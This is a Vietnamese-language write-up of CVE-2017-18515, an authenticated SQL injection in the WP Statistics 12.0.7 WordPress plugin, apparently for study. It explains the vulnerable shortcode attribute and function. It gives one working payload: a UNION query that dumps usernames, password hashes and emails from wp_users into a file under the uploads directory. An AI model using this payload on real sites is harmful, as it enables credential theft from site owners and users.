CVE-2017-18515
- Plugin : wpstatistics
- Phiên bản lỗi: 12.0.7
- Lỗi: (Authenticated) Blind SQL Injection

a)Mô tả 
- Plugin này cho phép người dùng sử dụng 1 số các shortcode để thông kê 1 số các thông tin(số người online, tổng số người đã ghé qua page,…) .
- Nhưng do 1 không kiểm soát đầu vào chặn chẽ nên khi kẻ tấn công vào được trang quản trị thì hacker có thể từ các tham số trong shortcode để thực hiện các truy vấn độc hại.

b) Hàm sử lý bị lỗi
- Trong số các chức năng khác, Thống kê WP cho phép người dùng quản trị nhận thông tin chi tiết liên quan đến số lượt truy cập chỉ bằng cách gọi mã ngắn bên dưới:
![image](https://github.com/Manh130902/wordpress/assets/93723285/1dba6335-b6ad-495a-a161-8f541a75f4b6)
![image](https://github.com/Manh130902/wordpress/assets/93723285/c542372a-99be-455f-bc15-8a5f0b71e843)

 
- Một số thuộc tính của mã ngắn wpstatistics đang được truyền dưới dạng tham số cho các chức năng quan trọng nhưng không được làm sạch
![image](https://github.com/Manh130902/wordpress/assets/93723285/a430902a-0cfb-4352-b488-c50c94406a4a)
![image](https://github.com/Manh130902/wordpress/assets/93723285/9472ca93-5733-4a59-9599-160317f11129)

 
- Một trong những chức năng dễ bị tấn công wp_statistics_searchengine_query() trong tệp “include/functions/functions.php”
- Về cơ bản, wp_statistics_searchengine_query () trả về giá trị giống như giá trị được chuyển trong nhà cung cấp thuộc tính mã ngắn và nội dung của nó được thêm trực tiếp vào truy vấn SQL .

c) Khai thác
- Khi ta vào được trang admin ta vào phần page và gọi lên shortcode
![image](https://github.com/Manh130902/wordpress/assets/93723285/8b61e134-0277-4363-b843-7e99b77cf5b8)
  
- Truy vấn trong thực hiện sẽ là

SELECT * FROM wp_statistics_useronline  WHERE provider="123'union select 1,2,user_login,user_pass,user_email,6 from wp_users into outfile '/opt/lampp/htdocs/wordpress/wp-content/uploads/test.txt'#"

- Kết quả là kết quả của truy vấn sẽ gửi về file test.txt
![image](https://github.com/Manh130902/wordpress/assets/93723285/414fdac5-e0d6-4462-9795-bbb31796159a)
 

